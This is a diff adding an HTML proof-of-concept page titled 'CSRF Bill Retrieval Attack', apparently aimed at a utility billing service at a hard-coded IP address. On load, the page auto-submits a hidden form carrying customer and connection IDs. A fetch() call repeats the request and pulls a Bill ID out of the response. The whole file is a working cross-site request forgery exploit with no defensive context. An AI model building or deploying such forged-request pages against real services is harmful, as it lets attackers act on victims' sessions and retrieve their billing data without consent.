@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Bill Retrieval Attack</title>
+</head>
+<body onload="document.forms['csrfForm'].submit()">
+    <form id="csrfForm" action="http://140.245.27.133/bill-retrieval" method="POST">
+        <input type="hidden" name="customer_id" value="LHR-COM-0005">
+        <input type="hidden" name="connection_id" value="DISCO-COM-1005">
+        <input type="hidden" name="month" value="8">
+        <input type="hidden" name="year" value="2024">
+    </form>
+
+    <script>
+        fetch("http://140.245.27.133/bill-retrieval", {
+            method: "POST",
+            body: new FormData(document.getElementById("csrfForm"))
+        })
+        .then(response => response.text())  // Get response as text
+        .then(text => {
+            console.log("Response received:", text); // Debugging
+            let matches = text.match(/Bill ID:\s*(\d+)/); // Extract Bill ID
+            if (matches) {
+                console.log("Extracted Bill ID: " + matches[1]); // Print Bill ID
+            } else {
+                console.log("No Bill ID found in response");
+            }
+        })
+        .catch(error => console.error("Error:", error));
+    </script>
+</body>
+</html>
